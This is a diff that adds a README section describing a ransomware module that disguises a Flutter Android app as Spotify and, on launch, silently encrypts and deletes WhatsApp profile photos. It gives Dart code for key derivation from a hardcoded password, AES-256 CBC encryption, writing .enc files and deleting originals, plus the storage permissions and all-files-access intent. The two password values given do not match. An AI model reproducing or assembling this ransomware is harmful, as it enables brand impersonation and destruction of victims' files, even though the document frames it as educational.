@@ -385,5 +385,94 @@ Before deployment, test all functionalities:
 This project is intended strictly for educational and research purposes only.  
 Do not deploy or use this code for any unethical, illegal, or malicious activities.  
 Misuse of this information may lead to serious legal consequences.
+# Spotify Module Configuration (Android - Dart Version)
 
+This module simulates a ransomware attack on Android by disguising a malicious Flutter application as the popular Spotify app.  
+The primary purpose of this module is to educate and demonstrate how attackers can abuse trusted brand identities and sensitive permissions to silently encrypt user files — in this case, WhatsApp profile photos.
 
+---
+
+## Summary
+
+| Component        | Description                                             |
+|------------------|---------------------------------------------------------|
+| App Name        | Spotify (disguised ransomware)                          |
+| Language/SDK    | Dart (Flutter Framework)                                |
+| Package Type    | Android APK                                             |
+| Target Directory| `/storage/emulated/0/WhatsApp/Media/WhatsApp Profile Photos/` |
+| Encryption Algorithm | AES-256 CBC                                      |
+| Password        | `FaizShiv200@123` (converted to key via SHA-256)          |
+| Permissions     | `MANAGE_EXTERNAL_STORAGE`                               |
+| Trigger         | Automatic encryption on app launch                      |
+| Output File     | Original files renamed with `.enc` extension            |
+
+---
+
+## Core Logic Overview
+
+The fake Spotify APK is a full Dart (Flutter) application that performs silent encryption of all image files inside the WhatsApp profile photo directory when launched.
+
+---
+
+### Key Generation (Dart)
+
+```dart
+final password = "Shivam200@123";
+final key = sha256.convert(utf8.encode(password)).bytes;
+final keySpec = encrypt.Key(Uint8List.fromList(key));
+```
+### IV Generation (Dart)
+
+```dart
+final ivBytes = encrypt.IV.fromSecureRandom(16);
+```
+### Encryption Flow (Dart)
+
+```dart
+final encrypter = encrypt.Encrypter(encrypt.AES(keySpec, mode: encrypt.AESMode.cbc));
+final encrypted = encrypter.encryptBytes(file.readAsBytesSync(), iv: ivBytes);
+```
+### Save Encrypted Files (Dart)
+
+```dart
+final encryptedFile = File('${file.path}.enc');
+encryptedFile.writeAsBytesSync(ivBytes.bytes + encrypted.bytes);
+file.deleteSync(); // Optional: delete original file
+```
+### Target Directory
+
+This module recursively searches for `.jpg`, `.jpeg`, `.png` files in the following WhatsApp directory:
+
+`/storage/emulated/0/WhatsApp/Media/WhatsApp Profile Photos/`
+
+As soon as the fake app (Spotify) is launched, the encryption begins without user interaction.
+
+---
+
+### Required Android Permissions (Manifest)
+
+```xml
+<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+```
+To enable full storage access, the app uses:
+
+```dart
+await AndroidIntent(
+  action: 'android.settings.MANAGE_ALL_FILES_ACCESS_PERMISSION',
+).launch();
+```
+This allows the ransomware to access, encrypt, and delete any files in the internal storage freely.
+
+---
+
+### Educational Focus
+
+This module helps in understanding:
+
+- The risk of sideloading APKs from unknown sources.
+- How legitimate-looking apps (like Spotify) can mask malicious intent.
+- How ransomware targets sensitive folders like WhatsApp.
+- How AES-256 CBC works with key + IV combo.
+- The impact of granting full storage permission to unknown apps.
